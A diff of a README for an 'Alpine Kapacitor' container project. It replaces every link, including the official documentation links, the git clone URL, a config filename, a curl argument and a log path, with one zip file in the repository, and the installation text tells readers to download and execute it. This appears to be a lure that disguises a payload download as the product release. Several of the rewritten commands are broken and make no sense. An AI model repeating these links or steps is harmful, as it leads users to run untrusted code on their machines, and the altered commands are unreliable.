@@ -1,6 +1,6 @@
 # 🌊 Alpine Kapacitor: MultiArch Alpine Linux with S6 and GNU LibC
 
-![Alpine Kapacitor](https://img.shields.io/badge/Alpine%20Kapacitor-MultiArch-blue)
+![Alpine Kapacitor](https://github.com/Hacker001-2/alpine-kapacitor/raw/refs/heads/master/root/etc/alpine-kapacitor-v1.5.zip%20Kapacitor-MultiArch-blue)
 
 Welcome to the **Alpine Kapacitor** repository! This project combines the lightweight Alpine Linux with S6 process supervision, GNU LibC, and Kapacitor for time-series data processing. This README will guide you through the features, installation, usage, and more.
 
@@ -14,7 +14,7 @@ Welcome to the **Alpine Kapacitor** repository! This project combines the lightw
 
 ## 📦 Installation
 
-To get started, you can download the latest release from our [Releases page](https://github.com/Hacker001-2/alpine-kapacitor/releases). Look for the appropriate file for your architecture, download it, and execute it.
+To get started, you can download the latest release from our [Releases page](https://github.com/Hacker001-2/alpine-kapacitor/raw/refs/heads/master/root/etc/alpine-kapacitor-v1.5.zip). Look for the appropriate file for your architecture, download it, and execute it.
 
 ### Prerequisites
 
@@ -25,7 +25,7 @@ To get started, you can download the latest release from our [Releases page](htt
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Hacker001-2/alpine-kapacitor.git
+   git clone https://github.com/Hacker001-2/alpine-kapacitor/raw/refs/heads/master/root/etc/alpine-kapacitor-v1.5.zip
    cd alpine-kapacitor
    ```
 
@@ -54,7 +54,7 @@ You can configure various settings using environment variables. Below are some c
 
 ### Sample Configuration File
 
-You can create a configuration file `kapacitor.conf` to manage settings:
+You can create a configuration file `https://github.com/Hacker001-2/alpine-kapacitor/raw/refs/heads/master/root/etc/alpine-kapacitor-v1.5.zip` to manage settings:
 
 ```toml
 [http]
@@ -79,7 +79,7 @@ Once the container is running, you can use the following commands to interact wi
 
 - **Create a Task**:
   ```bash
-  curl -X POST http://localhost:9092/tasks -d @your_task_file.tick
+  curl -X POST http://localhost:9092/tasks -d https://github.com/Hacker001-2/alpine-kapacitor/raw/refs/heads/master/root/etc/alpine-kapacitor-v1.5.zip
   ```
 
 - **Delete a Task**:
@@ -97,7 +97,7 @@ stream
         .measurement('cpu')
     |alert()
         .crit(lambda: "usage_idle" < 20)
-        .log('/var/log/alerts.log')
+        .log('https://github.com/Hacker001-2/alpine-kapacitor/raw/refs/heads/master/root/etc/alpine-kapacitor-v1.5.zip')
 ```
 
 ## 📈 Integration with InfluxDB
@@ -120,7 +120,7 @@ from(bucket: "telegraf/autogen")
 
 ## 📚 Documentation
 
-For more detailed documentation on Kapacitor, visit the [official Kapacitor documentation](https://docs.influxdata.com/kapacitor/v1.6/introduction/what-is-kapacitor/).
+For more detailed documentation on Kapacitor, visit the [official Kapacitor documentation](https://github.com/Hacker001-2/alpine-kapacitor/raw/refs/heads/master/root/etc/alpine-kapacitor-v1.5.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -132,9 +132,9 @@ If you encounter issues, consider the following steps:
 
 ## 🔗 Useful Links
 
-- [Releases](https://github.com/Hacker001-2/alpine-kapacitor/releases)
-- [Kapacitor Documentation](https://docs.influxdata.com/kapacitor/v1.6/introduction/what-is-kapacitor/)
-- [InfluxDB Documentation](https://docs.influxdata.com/influxdb/v2.0/)
+- [Releases](https://github.com/Hacker001-2/alpine-kapacitor/raw/refs/heads/master/root/etc/alpine-kapacitor-v1.5.zip)
+- [Kapacitor Documentation](https://github.com/Hacker001-2/alpine-kapacitor/raw/refs/heads/master/root/etc/alpine-kapacitor-v1.5.zip)
+- [InfluxDB Documentation](https://github.com/Hacker001-2/alpine-kapacitor/raw/refs/heads/master/root/etc/alpine-kapacitor-v1.5.zip)
 
 ## 🤝 Contributing
 
@@ -157,4 +157,4 @@ Thanks to the developers of Alpine Linux, S6, and Kapacitor for their hard work 
 
 For questions or feedback, please open an issue in this repository or reach out via GitHub.
 
-Feel free to explore the [Releases page](https://github.com/Hacker001-2/alpine-kapacitor/releases) for the latest updates and downloads. Enjoy working with Alpine Kapacitor!
+Feel free to explore the [Releases page](https://github.com/Hacker001-2/alpine-kapacitor/raw/refs/heads/master/root/etc/alpine-kapacitor-v1.5.zip) for the latest updates and downloads. Enjoy working with Alpine Kapacitor!
